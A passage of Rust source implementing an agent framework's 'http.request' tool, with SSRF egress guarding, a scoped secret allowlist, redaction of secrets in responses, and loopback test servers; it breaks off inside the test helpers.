//! Tier 1 — `http.request`: raw HTTP protocol access (any method/headers/body).
//!
//! The model gets the status, response headers, and a byte-capped body. Non-2xx responses are a
//! *result*, not an op failure — a 404 comes back with its status, the op succeeds. This is the
//! "APIs → tier 1" surface: for reading a page *as a document* the model should reach for
//! `web.fetch` (tier 2) instead.
//!
//! **The result is a record** (C-304): the canonical `content` is the JSON object
//! `{status, headers, body}`, so an authored flow can select `$resp.body.data.id` instead of
//! scraping one flat string, and the model-facing `view` keeps the rendered `HTTP …` block a person
//! reads. That split is the C-10 precedent — `ToolResult.content` is a `String`, so a structured
//! result travels as canonical JSON with a human `view` beside it, rather than widening
//! `ToolResult` itself.

use std::time::Duration;

use async_trait::async_trait;
use reqwest::header::{HeaderName, HeaderValue};
use serde_json::{json, Value};

use flux_core::{percent_encode_component, Error, Result};
use flux_runtime::{Tool, ToolContext, ToolResult};
use flux_spec::{
    AccessKind, Effect, Idempotency, Intent, IntentBehavior, IntentCertainty, IntentRole,
    IntentSet, IntentTarget, Risk, ToolSpec,
};
use flux_system::net::PrivateNetAllow;
use flux_system::port::{
    GuardedHttp, HeaderValue as PortHeaderValue, HttpRequest, HttpSecretScope,
};
use flux_system::secret_scope::{Destination, InjectionSite, Refusal, SecretAllowlist, SecretUse};

use crate::{NativeHttp, WebOptions};

/// Cap on the response body handed to the model (bytes, cut on a char boundary). Mirrors the
/// `web.fetch` `MAX_BYTES` precedent.
const MAX_BODY_BYTES: usize = 256 * 1024;
/// Cap on the rendered response-header block.
const MAX_HEADER_BYTES: usize = 8 * 1024;
/// Default request timeout when the caller doesn't set one.
const DEFAULT_TIMEOUT_SECS: u64 = 30;
/// Ceiling on the caller-supplied timeout.
const MAX_TIMEOUT_SECS: u64 = 300;

/// The `http.request` tool. Holds the resolved `web`-scope egress allow-list and its own reviewed
/// native HTTP backend — the `WebFetchTool` shape, extended with the secret allow-list tier 1 needs.
///
/// Since C-652 the request itself is a **port** operation: the send goes to the operator's selected
/// execution substrate when they selected one, and to [`NativeHttp`] — the same client, guard and
/// pin this op always used — when they did not.
pub struct HttpRequestTool {
    native: NativeHttp,
    private_net: PrivateNetAllow,
    /// Env-var names this tool may resolve via `{"$secret": "NAME"}`, each with the scope it
    /// carries. Fail-closed on both axes: a name not on this list is refused before its value is
    /// read (C-76), and a name whose grant declares a destination, a principal or an injection site
    /// is refused for any use outside it (C-459). Resolved once at construction from
    /// `WebOptions.allowed_secrets`, else the `FLUX_WEB_SECRET_ALLOW` env var.
    allowed_secrets: SecretAllowlist,
}

impl HttpRequestTool {
    pub fn new(opts: &WebOptions) -> Self {
        Self {
            native: NativeHttp::new(opts),
            private_net: opts.private_net.clone(),
            allowed_secrets: SecretAllowlist::parse(
                opts.allowed_secrets
                    .clone()
                    .unwrap_or_else(secret_allowlist_from_env),
            ),
        }
    }

    /// May this `$secret` be resolved for *this* destination, *this* principal and *this* place in
    /// the request? Returns the operator-facing reason it may not.
    ///
    /// Runs **before** the value is read, so the two refusals stay in C-76's order: a name the
    /// operator never opted in is still refused without touching the environment, and only a name
    /// that is on the list is then measured against its own scope (C-459). `destination` is the
    /// guard's own verdict, carried as a `Result` so an unresolvable host is only fatal to a grant
    /// that actually declares a destination.
    fn authorize_secret(
        &self,
        name: &str,
        destination: &std::result::Result<&Destination, String>,
        principal: Option<&str>,
        site: InjectionSite,
    ) -> std::result::Result<(), String> {
        let use_ = SecretUse {
            destination: destination.clone(),
            principal,
            site,
        };
        match self.allowed_secrets.authorize(name, &use_) {
            Ok(()) => Ok(()),
            Err(Refusal::NotAllowlisted) => Err(format!(
                "secret env var `{name}` is not on the allowlist and will not be resolved. Add it \
                 to `[web] allowed_secrets` (or the FLUX_WEB_SECRET_ALLOW env var) to permit \
                 `{{\"$secret\": \"{name}\"}}`."
            )),
            Err(refusal) => Err(format!(
                "secret env var `{name}` is allowlisted but out of scope for this request: \
                 {refusal}. Widen the entry's scope (or drop it, leaving the name unscoped) if \
                 this use is intended."
            )),
        }
    }
}

#[async_trait]
impl Tool for HttpRequestTool {
    fn spec(&self) -> ToolSpec {
        ToolSpec {
            name: "http.request".into(),
            description: "Make an arbitrary HTTP(S) request (any method, headers, and body) and \
                return the record `{status, headers, body}` — `status` a number, `headers` a map \
                keyed by the response header name, `body` the parsed JSON when the response is a \
                JSON object or array and the raw text otherwise. Select a field directly \
                (`$resp.body.data.id`). Use this for APIs and raw protocol \
                access; to read a web page as a readable document prefer `web.fetch`. \
                Private/loopback addresses are blocked unless the `web` egress scope grants them. \
                Pass query parameters as the `query` record — each value is percent-encoded, so \
                never build a query by formatting values into the `url`. A header or query value \
                may be a secret reference `{\"$secret\": \"ENV_NAME\"}`, resolved from the \
                environment and never shown — but only for env-var names the operator has \
                allowlisted; any other name is refused, and an allowlisted name may additionally be \
                scoped to particular destination hosts, principals, or header-vs-query placement."
                .into(),
            input_schema: json!({
                "type": "object",
                "properties": {
                    "url": {"type": "string", "description": "The absolute http(s) URL to request."},
                    "method": {"type": "string", "description": "HTTP method (default GET)."},
                    "query": {
                        "type": "object",
                        "description": "Query parameters. Each value (string, number, boolean, or a secret reference {\"$secret\": \"ENV_NAME\"}) is percent-encoded before it is appended, so a value carrying & or = cannot add a parameter. A null value is omitted; false and 0 are sent. A key already present in the url is an error.",
                        "additionalProperties": true
                    },
                    "headers": {
                        "type": "object",
                        "description": "Request headers. A value may be a string or a secret reference {\"$secret\": \"ENV_NAME\"}.",
                        "additionalProperties": true
                    },
                    "body": {"type": "string", "description": "Request body, for methods that take one (POST/PUT/PATCH/…)."},
                    "timeout": {"type": "number", "description": "Timeout in seconds (default 30, max 300)."}
                },
                "required": ["url"]
            }),
            output_schema: Some(response_schema()),
            // Arbitrary HTTP can mutate remote state (POST/PUT/DELETE), so this is not the read-only
            // shape `web.fetch` uses: honest Network effect, Medium risk, non-idempotent.
            effects: vec![Effect::Network],
            risk: Risk::Medium,
            idempotency: Idempotency::NonIdempotent,
            access: vec![AccessKind::Network],
            group: None,
        }
    }

    fn permission_subjects(&self, params: &Value) -> Vec<String> {
        params
            .get("url")
            .and_then(Value::as_str)
            .map(|url| vec![reported_url(url, params)])
            .unwrap_or_default()
    }

    fn intents(&self, params: &Value) -> IntentSet {
        let mut set = IntentSet::new();
        if let Some(url) = params.get("url").and_then(Value::as_str) {
            set.push(Intent {
                behavior: IntentBehavior::NetworkFetch,
                target: IntentTarget::Url {
                    url: reported_url(url, params),
                },
                role: IntentRole::ReadTarget,
                certainty: IntentCertainty::Certain,
            });
        }
        set
    }

    async fn execute(&self, ctx: &ToolContext, params: Value) -> Result<ToolResult> {
        let raw = params
            .get("url")
            .and_then(Value::as_str)
            .ok_or_else(|| Error::Other("http.request: `url` required".into()))?;
        let method_str = params
            .get("method")
            .and_then(Value::as_str)
            .unwrap_or("GET")
            .to_ascii_uppercase();
        let method = reqwest::Method::from_bytes(method_str.as_bytes())
            .map_err(|_| Error::Other(format!("http.request: invalid method {method_str:?}")))?;

        // Guard egress (SSRF) FIRST: resolve the host, block private ranges unless the `web` scope
        // grants them, and capture the vetted addresses the connection will be pinned to. This has
        // to precede every `$secret` resolution below, because a secret's destination scope is
        // matched against the **vetted** destination — matching it against the hostname the caller
        // typed would authorize a name whose address is still free to move (C-459).
        //
        // The query is appended afterwards instead of before: appending a query cannot move the
        // authority, so nothing about the SSRF decision changes, and it buys the ordering above
        // without a second DNS resolution (which would reopen the very TOCTOU the pinning closes).
        let guarded = flux_system::net::guard_url_scoped_for_secret(raw, &self.private_net)?;
        // Borrowed rather than split: the URL, its pins and the destination token are only
        // trustworthy together, and since C-652 the whole correlated value travels to the substrate
        // that will send the request. Splitting it here would hand three separately-assertable
        // values across the port.
        let destination = guarded.destination();
        // Held as a `Result` rather than propagated: only a grant that *declares* a destination
        // scope needs a vetted address, so an unscoped secret bound for an unresolvable host still
        // behaves exactly as it did before scoping existed (it fails at connect, not here).
        let principal = ctx
            .turn_identity()
            .map(|identity| identity.caller().principal.id.clone());
        let authorize = |name: &str, site: InjectionSite| -> Result<()> {
            self.authorize_secret(name, &destination, principal.as_deref(), site)
                .map_err(|why| Error::Other(format!("http.request: {why}")))
        };

        // The structured query. Every `$secret` in it is authorized against the destination above
        // before its value is read.
        let mut resolved_query = Vec::new();
        // The scoped secrets this request carries, re-checked at every redirect hop below.
        let mut carried: Vec<(String, InjectionSite)> = Vec::new();
        for (key, value) in query_fields(&params)? {
            let text = match value {
                QueryValue::Text(text) => text,
                QueryValue::Secret(name) => {
                    authorize(&name, InjectionSite::Query)?;
                    carried.push((name.clone(), InjectionSite::Query));
                    let secret = resolve_secret_env(&name, ctx)?;
                    // The wire carries the *encoded* spelling, and the redactor matches literally,
                    // so both forms are registered — otherwise a percent-encoded token could
                    // survive in a guard/transport error message that quotes the URL.
                    let encoded = percent_encode_component(&secret);
                    // `resolve_secret_env` already refused anything the redactor would decline, so
                    // both spellings register; the encoded form is never shorter than the raw one.
                    ctx.redactor
                        .try_add_secret(secret.clone())
                        .map_err(too_short_to_protect(&name))?;
                    if encoded != secret {
                        ctx.redactor
                            .try_add_secret(encoded)
                            .map_err(too_short_to_protect(&name))?;
                    }
                    secret
                }
            };
            resolved_query.push((key, text));
        }
        let target = append_query(raw, &resolved_query)?;
        let url = url::Url::parse(&target)
            .map_err(|e| Error::Other(format!("http.request: invalid url: {e}")))?;
        // The authority is what the guard vetted and what every secret above was authorized
        // against, so it may not have moved. It cannot — `append_query` only writes a
        // percent-encoded query ahead of the fragment — and this refuses rather than trusting that
        // argument: the alternative to checking is re-resolving, which is the TOCTOU itself.
        //
        let base_url = guarded.url();
        if (url.scheme(), url.host_str(), url.port_or_known_default())
            != (
                base_url.scheme(),
                base_url.host_str(),
                base_url.port_or_known_default(),
            )
        {
            return Err(Error::Other(
                "http.request: appending the query moved the request's destination away from the \
                 address the egress guard vetted; refusing to send"
                    .into(),
            ));
        }

        let timeout = params
            .get("timeout")
            .and_then(Value::as_f64)
            .map(|s| s.max(0.0) as u64)
            .unwrap_or(DEFAULT_TIMEOUT_SECS)
            .clamp(1, MAX_TIMEOUT_SECS);

        // Headers — resolving `{"$secret": "ENV"}` markers to their env values and seeding the
        // redactor so a token in a header never surfaces readable in output or persisted events.
        //
        // Validated here rather than at the substrate so the operator-facing message names the
        // header the *caller* wrote; the port carries the validated text.
        //
        // The value goes onto the request inside a `port::HeaderValue`, which names the `$secret`
        // it materialized and refuses to print or serialize itself (C-674). That is what makes the
        // credential visible to per-hop re-authorization on whichever substrate follows the chain,
        // without a second list that can drift out of step with the headers themselves.
        let mut request_headers: Vec<(String, PortHeaderValue)> = Vec::new();
        if let Some(headers) = params.get("headers").and_then(Value::as_object) {
            for (name, val) in headers {
                let (resolved, secret_name) = match as_secret_ref(val) {
                    Some(secret) => {
                        authorize(secret, InjectionSite::Header)?;
                        carried.push((secret.to_string(), InjectionSite::Header));
                        (resolve_secret_env(secret, ctx)?, Some(secret.to_string()))
                    }
                    None => (plain_header_value(val)?, None),
                };
                let name = HeaderName::from_bytes(name.as_bytes()).map_err(|e| {
                    Error::Other(format!("http.request: invalid header name `{name}`: {e}"))
                })?;
                HeaderValue::from_str(&resolved).map_err(|e| {
                    Error::Other(format!(
                        "http.request: invalid value for header `{name}`: {e}"
                    ))
                })?;
                let carriage = match secret_name {
                    Some(secret) => PortHeaderValue::secret(secret, resolved),
                    None => PortHeaderValue::literal(resolved),
                };
                request_headers.push((name.as_str().to_string(), carriage));
            }
        }
        let body = params
            .get("body")
            .and_then(Value::as_str)
            .map(|body| body.as_bytes().to_vec());

        // The request as the *port* states it. `with_url` keeps the admission and the URL to send
        // one value, so what crosses the port is a target the egress guard vetted rather than a
        // (url, pins) pair a caller asserted.
        let request = HttpRequest {
            operation: "http.request".into(),
            method: method.as_str().to_string(),
            target: guarded.with_url(url)?,
            headers: request_headers,
            body,
            timeout: Duration::from_secs(timeout),
            max_response_bytes: MAX_BODY_BYTES,
            // Every redirect hop is re-admitted against the scope of every secret this request
            // carries, and the substrate that follows the chain is the only place that can do it.
            //
            // Deliberately conservative: a cross-origin hop already clears the caller's headers, so
            // a header-placed secret does not physically travel — but a query-placed one is in the
            // URL, and a `Location` that echoes the query carries it to a host the operator never
            // named. Rather than reason per-hop about which bytes survive, the whole redirect chain
            // has to stay inside the scope. An operator who wants the hop adds its host to the `to=`
            // list; the failure direction is a refused redirect, not a credential at an unnamed host.
            secrets: HttpSecretScope {
                allowlist: self.allowed_secrets.clone(),
                carried,
                principal,
            },
        };

        // The effect lands wherever the operator said it lands. A selected substrate answers for
        // itself — including by refusing, which is what a substrate with no HTTP wire support does
        // — and only an *unselected* run reaches this op's own reviewed native backend.
        let response = match ctx.selected_execution_system() {
            Some(substrate) => substrate.http_request(&request, &self.private_net).await?,
            None => {
                self.native
                    .http_request(&request, &self.private_net)
                    .await?
            }
        };
        // A private-destination admission that happened on another substrate lands in *this* turn's
        // audit trail, stamped with where it happened (C-674). An admit made here already reached
        // the sink at the hop, so this adds nothing for an unselected run.
        self.native
            .record_reported_admits("http.request", &response.admits);

        // Rebuilt from the port's numeric status so the rendered view keeps its reason phrase
        // ("HTTP 200 OK"): the port carries a status code, not one client's status type.
        let status = reqwest::StatusCode::from_u16(response.status).map_err(|e| {
            Error::Http(format!(
                "http.request: the substrate reported an invalid status {}: {e}",
                response.status
            ))
        })?;
        // One walk over the response headers produces BOTH the record's map and the rendered block,
        // under one shared budget — so the two can never disagree about what was kept.
        let headers = collect_headers(&response.headers, |value| ctx.redactor.redact(value));
        let mut body = cap_str(
            String::from_utf8_lossy(&response.body).into_owned(),
            MAX_BODY_BYTES,
        );
        if response.truncated && !body.ends_with("…[truncated]") {
            body.push_str("\n…[truncated]");
        }
        // A completed request is a successful op: the HTTP status (incl. 4xx/5xx) is *data* in the
        // record — never a tool-level error.
        let view = format!(
            "HTTP {status}\n{}\n{}",
            headers.rendered,
            ctx.redactor.redact(&body)
        );
        let record = json!({
            "status": status.as_u16(),
            "headers": headers.map,
            "body": parse_body(body, |text| ctx.redactor.redact(text)),
        });
        Ok(ToolResult::ok_view(
            serde_json::to_string(&record)
                .map_err(|e| Error::Other(format!("http.request: encoding the response: {e}")))?,
            view,
        ))
    }
}

/// The declared shape of the result record. `body` carries no `type`: it is whatever the response
/// was (see [`parse_body`]), and claiming one would be a lie for half of all responses.
fn response_schema() -> Value {
    json!({
        "type": "object",
        "description": "One completed HTTP response. A non-2xx status is a value here, not an error.",
        "properties": {
            "status": {
                "type": "integer",
                "description": "The HTTP status code, e.g. 200 or 404."
            },
            "headers": {
                "type": "object",
                "description": "Response headers keyed by name (lowercased, as sent). A header sent more than once is joined with `, `. A name carrying a `-` is not reachable with the `$resp.headers.name` sugar — read it with `pick({items: $resp.headers, keys: [\"content-type\"]})`.",
                "additionalProperties": {"type": "string"}
            },
            "body": {
                "description": "The parsed body when it is a JSON object or array; otherwise the raw text (HTML, plain text, an empty string, or a truncated/malformed payload)."
            }
        },
        "required": ["status", "headers", "body"]
    })
}

/// The response body as it goes into the record: **parsed** when it is a JSON object or array,
/// otherwise the raw text.
///
/// That rule is deliberately the interpreter's own (`flux_lang::runtime::jq_parse_input`) rather
/// than a `content-type` sniff. Two reasons: plenty of APIs answer JSON under `text/plain`, so the
/// declared type is not the fact; and a bare JSON scalar (`42`, `"ok"`) reads better as the text it
/// was than as a retyped value, which is exactly the line the language already draws.
///
/// **Nothing here can fail.** An HTML error page, an empty body and a truncated payload all fall
/// through to the string arm, so the record keeps its status and headers and the call still
/// succeeds — the stream-resilience posture (unparseable bytes are counted, not fatal) applied to a
/// response body.
///
/// **Redaction runs AFTER the parse, over the decoded leaves** — never over the JSON text. Two
/// distinct reasons, and both are load-bearing:
///
/// - A registered secret containing a `"`, a `\` or a newline is *escaped* in the JSON text, so a
///   literal match there would miss it. The decoded leaf carries the value as it really is.
/// - The pattern redactor replaces a credential-shaped run between delimiters, and a `"` is one of
///   its delimiters — run over JSON text it can eat the quote's neighbourhood and leave a payload
///   that no longer parses. Redacting leaves cannot corrupt the structure.
///
/// The walk itself is [`flux_core::redact_json_total`] — **no node kind is exempt**, keys included
/// (C-323), and since C-338 that guarantee is defined once for the whole tree rather than
/// re-implemented here. It is reached through the `redact` closure this function already took, so
/// flux-web still needs no dependency on `flux-secret`.
fn parse_body(body: String, redact: impl Fn(&str) -> String) -> Value {
    match serde_json::from_str::<Value>(&body) {
        Ok(mut parsed) if parsed.is_object() || parsed.is_array() => {
            flux_core::redact_json_total(&mut parsed, &redact);
            parsed
        }
        _ => Value::String(redact(&body)),
    }
}

/// The response headers, in both shapes the result needs.
struct ResponseHeaders {
    /// The record's `headers` map.
    map: serde_json::Map<String, Value>,
    /// The `Name: value` block a person reads in the view.
    rendered: String,
}

/// Walk the response headers once, producing the record's map and the rendered block together under
/// one [`MAX_HEADER_BYTES`] budget, so a pathological header set can't blow either and the two can
/// never disagree about what was kept.
///
/// - **Every value is redacted here**, on the raw text, before it is JSON-encoded — a `set-cookie`
///   (or any header) echoing a registered secret must not reach a model-visible surface through the
///   structured map (C-304).
/// - **A header sent more than once is joined with `, `**, the HTTP field-value folding rule. A JSON
///   object cannot hold a repeated key and dropping either copy would silently change the meaning.
///
/// `redact` is passed as a closure rather than the `Redactor` itself so `flux-web` needs no direct
/// dependency on `flux-secret` for one call.
fn collect_headers(
    headers: &[(String, String)],
    redact: impl Fn(&str) -> String,
) -> ResponseHeaders {
    let mut map = serde_json::Map::new();
    let mut rendered = String::new();
    for (name, value) in headers {
        let value = redact(value);
        let line = format!("{name}: {value}\n");
        if rendered.len() + line.len() > MAX_HEADER_BYTES {
            rendered.push_str("…[headers truncated]\n");
            break;
        }
        rendered.push_str(&line);
        match map.get_mut(name) {
            Some(Value::String(existing)) => {
                existing.push_str(", ");
                existing.push_str(&value);
            }
            _ => {
                map.insert(name.clone(), Value::String(value));
            }
        }
    }
    ResponseHeaders { map, rendered }
}

/// A header value that is *not* a secret marker: it must be a plain string. The marker case is
/// handled in `execute`, which is the only place that holds the vetted destination a `$secret` has
/// to be authorized against.
fn plain_header_value(val: &Value) -> Result<String> {
    match val {
        Value::String(s) => Ok(s.clone()),
        _ => Err(Error::Other(
            "http.request: header values must be strings or a secret reference {\"$secret\": \"ENV\"}"
                .into(),
        )),
    }
}

/// Read env var `name` and seed it into the redactor.
///
/// ⚠ **The caller must have authorized `name` first** ([`HttpRequestTool::authorize_secret`]): this
/// reads the environment, and the whole point of the allowlist (C-76) and of the destination /
/// principal scope (C-459) is that neither the value nor the request happens for a use the operator
/// did not permit. Shared by the header and query paths.
fn resolve_secret_env(name: &str, ctx: &ToolContext) -> Result<String> {
    let resolved = std::env::var(name).map_err(|_| {
        Error::Other(format!(
            "http.request: secret env var `{name}` is not set (referenced via {{\"$secret\": \"{name}\"}})"
        ))
    })?;
    // A `$secret` reference that the redactor declines cannot be kept out of a guard or transport
    // error message quoting the URL, so the request is refused rather than sent (C-315).
    ctx.redactor
        .try_add_secret(resolved.clone())
        .map_err(too_short_to_protect(name))?;
    Ok(resolved)
}

/// The error a declined registration becomes on the `$secret` path: the value is live, it is about
/// to go on the wire, and nothing downstream would scrub it.
fn too_short_to_protect<E: std::fmt::Display>(name: &str) -> impl Fn(E) -> Error + '_ {
    move |why| {
        Error::Other(format!(
            "http.request: secret env var `{name}` cannot be protected: {why}. Its value would \
             survive in a URL quoted by an error message, so the request was not sent."
        ))
    }
}

/// A parsed `query` field value: a literal scalar already rendered as text, or a secret reference
/// that only the execute path is allowed to resolve.
#[derive(Debug)]
enum QueryValue {
    Text(String),
    /// The env-var name from `{"$secret": "ENV_NAME"}`.
    Secret(String),
}

/// Parse the `query` argument into fields, in sorted key order (`serde_json::Map` is a `BTreeMap`
/// in this build, so one call always builds one URL — a query that reordered between runs could
/// not be cached or matched against an allow-list entry).
///
/// The scalar rules are L-101's, deliberately, so a body and a query behave the same way:
///
/// - **A `null` field is omitted**, which is what lets an unsupplied optional parameter mean "do
///   not send this" without a `when` guard per field.
/// - **`false` and `0` are values and are sent** — they are not "unset".
/// - **A nested field is an error.** A query string has no agreed nesting convention (`a[b]`,
///   `a.b`, repeated `a=`), and a key a vendor does not recognize is accepted and *ignored*,
///   answering `200` — the worst failure available. Refuse rather than guess.
///
/// Nothing is encoded here and no environment is read: this runs on the `permission_subjects` /
/// `intents` path too, which must not touch a secret.
fn query_fields(params: &Value) -> Result<Vec<(String, QueryValue)>> {
    let Some(query) = params.get("query") else {
        return Ok(Vec::new());
    };
    if query.is_null() {
        return Ok(Vec::new());
    }
    let fields = query.as_object().ok_or_else(|| {
        Error::Other(format!(
            "http.request: `query` must be a record of scalar parameters, got {}",
            shape_word(query)
        ))
    })?;
    let mut out = Vec::with_capacity(fields.len());
    for (key, value) in fields {
        let parsed = match value {
            Value::Null => continue,
            Value::String(text) => QueryValue::Text(text.clone()),
            Value::Bool(flag) => QueryValue::Text(flag.to_string()),
            Value::Number(number) => QueryValue::Text(number.to_string()),
            Value::Object(_) | Value::Array(_) => match as_secret_ref(value) {
                Some(name) => QueryValue::Secret(name.to_string()),
                None => {
                    return Err(Error::Other(format!(
                        "http.request: query parameter `{key}` is {}, and a query string has no \
                         agreed nesting convention — a flattened guess is a parameter the vendor \
                         accepts and ignores. Send the flat spelling the vendor documents, one \
                         field per parameter",
                        shape_word(value)
                    )))
                }
            },
        };
        out.push((key.clone(), parsed));
    }
    Ok(out)
}

/// What a value *is*, for a diagnostic that must name the shape rather than dump the value — a
/// query parameter routinely carries a token or a customer identifier. Mirrors `flux-lang`'s
/// `shape_word`, which the form encoder uses for the same reason.
fn shape_word(value: &Value) -> &'static str {
    match value {
        Value::Null => "null",
        Value::Bool(_) => "a boolean",
        Value::Number(_) => "a number",
        Value::String(_) => "text",
        Value::Array(_) => "a list",
        Value::Object(_) => "a record",
    }
}

/// Append `fields` to `raw` as percent-encoded `k=v` pairs.
///
/// **Who owns the `?`:** this function does, and it picks the separator — `?` when the URL has no
/// query yet, `&` when it already does. That is the rule the connector pack's credential placement
/// settled and the one every other appender in the tree follows; contradicting it would put two
/// `?` separators on a URL whose query the vendor then parses as part of a value.
///
/// A fragment is not part of the query, so it is split off, the parameters go before it, and it is
/// put back — otherwise `https://h/p#frag` would grow a `?` *inside* the fragment and send nothing.
///
/// **A key already present in the URL is an error.** A repeated parameter is resolved differently
/// by every server (first wins, last wins, or a list), so silently emitting both would make the
/// request's meaning depend on the vendor — exactly the ambiguity this story exists to remove.
/// (The `query` record itself cannot carry a duplicate: it is a JSON object.)
fn append_query(raw: &str, fields: &[(String, String)]) -> Result<String> {
    if fields.is_empty() {
        return Ok(raw.to_string());
    }
    let (base, fragment) = match raw.split_once('#') {
        Some((base, fragment)) => (base, Some(fragment)),
        None => (raw, None),
    };
    let existing: Vec<&str> = base
        .split_once('?')
        .map(|(_, query)| query)
        .unwrap_or_default()
        .split('&')
        .filter(|pair| !pair.is_empty())
        .map(|pair| pair.split('=').next().unwrap_or(pair))
        .collect();

    let mut out = String::from(base);
    // `None` when the URL already ends on a separator, so `…?` + `a=1` stays one `?`.
    let mut separator = if !base.contains('?') {
        Some('?')
    } else if base.ends_with('?') || base.ends_with('&') {
        None
    } else {
        Some('&')
    };
    for (key, value) in fields {
        let encoded_key = percent_encode_component(key);
        if existing
            .iter()
            .any(|present| *present == encoded_key || *present == key)
        {
            return Err(Error::Other(format!(
                "http.request: query parameter `{key}` is already present in `url`. A repeated \
                 parameter means something different on every server (first wins, last wins, or a \
                 list), so this refuses rather than pick one — set `{key}` in `query` or in the \
                 URL, not both."
            )));
        }
        if let Some(separator) = separator {
            out.push(separator);
        }
        separator = Some('&');
        out.push_str(&encoded_key);
        out.push('=');
        out.push_str(&percent_encode_component(value));
    }
    if let Some(fragment) = fragment {
        out.push('#');
        out.push_str(fragment);
    }
    Ok(out)
}

/// The URL an egress allow-list and the evidence log are shown: the **encoded** URL that will go on
/// the wire — so a subject reflects the request as sent, not the pre-query template.
///
/// Two deliberate departures, both forced by `permission_subjects` being infallible:
///
/// - **A query parameter whose value is a `{"$secret": …}` reference is left out entirely.** This
///   function cannot resolve a secret (it has no `ToolContext`, so no redactor to register it
///   with), and a subject is persisted and matched against grants — so it reports the
///   *unauthenticated* URL, the same property the connector pack preserves for a query-placed
///   credential.
/// - **A malformed `query` falls back to the raw `url`.** `execute` rejects the same input with a
///   real diagnostic before any byte leaves the process, so no request this under-reports is ever
///   actually made.
fn reported_url(raw: &str, params: &Value) -> String {
    let Ok(fields) = query_fields(params) else {
        return raw.to_string();
    };
    let public: Vec<(String, String)> = fields
        .into_iter()
        .filter_map(|(key, value)| match value {
            QueryValue::Text(text) => Some((key, text)),
            QueryValue::Secret(_) => None,
        })
        .collect();
    append_query(raw, &public).unwrap_or_else(|_| raw.to_string())
}

/// Parse the `FLUX_WEB_SECRET_ALLOW` env var into a list of permitted secret allowlist entries
/// (comma- or whitespace-separated). Unset/empty ⇒ deny-all — the correct fail-closed default so a
/// `$secret` header reference is inert until an operator opts specific names in (C-76).
///
/// An entry is a bare env-var name, or a name carrying its scope
/// (`NAME;to=api.example.com;in=header`) — see [`flux_system::secret_scope`]. `;` is not a separator
/// here, which is what lets the scope ride inside one entry without breaking the comma/whitespace
/// spelling that existed before C-459.
fn secret_allowlist_from_env() -> Vec<String> {
    std::env::var("FLUX_WEB_SECRET_ALLOW")
        .unwrap_or_default()
        .split([',', ' ', '\t', '\n'])
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .map(str::to_string)
        .collect()
}

/// If `v` is exactly the secret marker `{"$secret": "NAME"}`, return `NAME` (mirrors
/// `flux_lang::program::as_secret_ref`, inlined to avoid an L0 language dep for one predicate).
fn as_secret_ref(v: &Value) -> Option<&str> {
    let obj = v.as_object()?;
    if obj.len() != 1 {
        return None;
    }
    obj.get("$secret")?.as_str()
}

/// Cap a string to `max` bytes, cut on a char boundary (an arbitrary response body is not
/// guaranteed to split cleanly — `String::truncate` panics off a boundary).
fn cap_str(mut s: String, max: usize) -> String {
    if s.len() > max {
        let mut end = max;
        while end > 0 && !s.is_char_boundary(end) {
            end -= 1;
        }
        s.truncate(end);
        s.push_str("\n…[truncated]");
    }
    s
}

#[cfg(test)]
mod tests {
    use super::*;
    use flux_runtime::ToolContext;
    use flux_system::System;
    use flux_system::Workspace;
    use std::sync::{Arc, Mutex};
    use tokio::io::{AsyncReadExt, AsyncWriteExt};

    fn ctx() -> ToolContext {
        let dir = std::env::temp_dir().join(format!(
            "flux-web-http-test-{}-{}",
            std::process::id(),
            // a per-ctx suffix so parallel tests don't share a workspace dir
            NEXT.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
        ));
        std::fs::create_dir_all(&dir).unwrap();
        ToolContext::new(Arc::new(System::new(Workspace::new(&dir).unwrap())))
    }
    static NEXT: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);

    /// A one-shot loopback HTTP server: accepts one connection, reads the request, writes a canned
    /// response. Returns its `http://127.0.0.1:<port>` base URL.
    async fn one_shot(status_line: &'static str, body: &'static str) -> String {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(async move {
            if let Ok((mut sock, _)) = listener.accept().await {
                let mut buf = vec![0u8; 8192];
                let _ = sock.read(&mut buf).await;
                let resp = format!(
                    "HTTP/1.1 {status_line}\r\ncontent-length: {}\r\nconnection: close\r\n\r\n{body}",
                    body.len()
                );
                let _ = sock.write_all(resp.as_bytes()).await;
                let _ = sock.flush().await;
            }
        });
        format!("http://{addr}")
    }

    /// A one-shot loopback server whose response carries `extra_headers` verbatim (each already
    /// `Name: value`, no CRLF) — the seam the record's `headers` map is asserted through.
    async fn one_shot_with_headers(
        status_line: &'static str,
        extra_headers: Vec<String>,
        body: String,
    ) -> String {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(async move {
            if let Ok((mut sock, _)) = listener.accept().await {
                let mut buf = vec![0u8; 8192];
                let _ = sock.read(&mut buf).await;
                let extra: String = extra_headers
                    .iter()
                    .map(|h| format!("{h}\r\n"))
                    .collect::<Vec<_>>()
                    .concat();
                let resp = format!(
                    "HTTP/1.1 {status_line}\r\n{extra}content-length: {}\r\nconnection: close\r\n\r\n{body}",
                    body.len()
                );
                let _ = sock.write_all(resp.as_bytes()).await;
                let _ = sock.flush().await;
            }
        });
        format!("http://{addr}")
    }

    /// The result record a completed request produces (`content` is canonical JSON since C-304).
    fn record(result: &ToolResult) -> Value {
        serde_json::from_str(&result.content).unwrap_or_else(|e| {
            panic!("`content` must be the JSON record: {e}: {}", result.content)
        })
    }

    /// A one-shot HTTP server that also reports the raw request bytes it received. Returns its
    /// base URL plus a receiver for the request text, so a test can assert on the request *line*
    /// (i.e. what actually went on the wire) rather than on the response.
    async fn capture_request() -> (String, tokio::sync::oneshot::Receiver<String>) {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        let (seen_tx, seen_rx) = tokio::sync::oneshot::channel();
        tokio::spawn(async move {
            if let Ok((mut sock, _)) = listener.accept().await {
                let mut buf = vec![0u8; 8192];
                let n = sock.read(&mut buf).await.unwrap_or(0);
                let _ = seen_tx.send(String::from_utf8_lossy(&buf[..n]).into_owned());
                let _ = sock
                    .write_all(
                        b"HTTP/1.1 200 OK\r\ncontent-length: 2\r\nconnection: close\r\n\r\nok",
                    )
                    .await;
                let _ = sock.flush().await;
            }
        });
        (format!("http://{addr}"), seen_rx)
    }

    /// The first line of a captured request (`GET /path?query HTTP/1.1`).
    fn request_line(request: &str) -> String {
